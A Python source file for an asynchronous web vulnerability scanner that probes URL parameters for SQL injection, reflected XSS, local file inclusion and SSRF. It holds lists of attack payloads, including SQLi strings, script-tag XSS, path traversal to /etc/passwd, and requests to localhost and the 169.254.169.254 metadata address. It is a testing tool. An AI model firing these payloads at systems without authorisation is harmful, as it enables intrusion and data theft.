"""Web vulnerability scanner (SQLi, XSS, LFI, SSRF)."""
import asyncio
import httpx
import re
import urllib.parse
from typing import Dict, Any, List, Optional

SQLI_PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "1' AND '1'='1"]
SQLI_ERRORS = [r"SQL syntax.*MySQL", r"Warning.*mysql_", r"PostgreSQL.*ERROR", r"ORA-\d{5}", r"SQLite.*error", r"SQLSTATE\["]

XSS_PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "javascript:alert(1)"]

LFI_PAYLOADS = ["../../../etc/passwd", "....//....//etc/passwd", "/etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"]
LFI_PATTERNS = [r"root:.*:0:0:", r"\[boot loader\]"]

SSRF_PAYLOADS = ["http://127.0.0.1", "http://localhost", "http://169.254.169.254"]


class VulnScanner:
    """Web vulnerability scanner."""

    def __init__(self, timeout: float = 10.0, concurrency: int = 10):
        self.timeout = timeout
        self.concurrency = concurrency

    async def scan(self, url: str, scan_types: List[str] = None, params: List[str] = None) -> Dict[str, Any]:
        """Scan for web vulnerabilities."""
        if not url.startswith(("http://", "https://")):
            url = f"https://{url}"
        url = url.rstrip("/")

        scan_types = scan_types or ["sqli", "xss", "lfi"]
        params = params or ["id", "page", "file", "url", "q", "search", "query"]

        results = {"sqli": [], "xss": [], "lfi": [], "ssrf": []}

        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True) as client:
            for param in params:
                test_url = f"{url}?{param}=FUZZ"

                if "sqli" in scan_types:
                    results["sqli"].extend(await self._test_sqli(client, test_url, param))
                if "xss" in scan_types:
                    results["xss"].extend(await self._test_xss(client, test_url, param))
                if "lfi" in scan_types:
                    results["lfi"].extend(await self._test_lfi(client, test_url, param))
                if "ssrf" in scan_types:
                    results["ssrf"].extend(await self._test_ssrf(client, test_url, param))

        findings = []
        for vtype, vulns in results.items():
            for v in vulns:
                findings.append({
                    "type": vtype, "severity": "high",
                    "param": v.get("param"), "payload": v.get("payload"),
                    "url": v.get("url"), "evidence": v.get("evidence"),
                    "description": f"{vtype.upper()} in parameter '{v.get('param')}'"
                })

        return {
            "url": url,
            "findings": findings,
            "total": len(findings),
            "summary": {k: len(v) for k, v in results.items()}
        }

    async def _test_sqli(self, client, test_url: str, param: str) -> List[Dict]:
        vulns = []
        for payload in SQLI_PAYLOADS[:4]:
            url = test_url.replace("FUZZ", urllib.parse.quote(payload))
            try:
                r = await client.get(url)
                for pattern in SQLI_ERRORS:
                    if re.search(pattern, r.text, re.IGNORECASE):
                        vulns.append({"param": param, "payload": payload, "url": url, "evidence": pattern})
                        return vulns
            except:
                pass
        return vulns

    async def _test_xss(self, client, test_url: str, param: str) -> List[Dict]:
        vulns = []
        for payload in XSS_PAYLOADS[:3]:
            url = test_url.replace("FUZZ", urllib.parse.quote(payload))
            try:
                r = await client.get(url)
                if payload in r.text:
                    vulns.append({"param": param, "payload": payload, "url": url, "evidence": "Reflected"})
                    return vulns
            except:
                pass
        return vulns

    async def _test_lfi(self, client, test_url: str, param: str) -> List[Dict]:
        vulns = []
        for payload in LFI_PAYLOADS[:3]:
            url = test_url.replace("FUZZ", urllib.parse.quote(payload))
            try:
                r = await client.get(url)
                for pattern in LFI_PATTERNS:
                    if re.search(pattern, r.text):
                        vulns.append({"param": param, "payload": payload, "url": url, "evidence": pattern})
                        return vulns
            except:
                pass
        return vulns

    async def _test_ssrf(self, client, test_url: str, param: str) -> List[Dict]:
        vulns = []
        for payload in SSRF_PAYLOADS[:2]:
            url = test_url.replace("FUZZ", urllib.parse.quote(payload))
            try:
                r = await client.get(url, timeout=5.0)
                if r.status_code == 200 and len(r.text) > 0:
                    vulns.append({"param": param, "payload": payload, "url": url, "evidence": "Response received"})
            except:
                pass
        return vulns
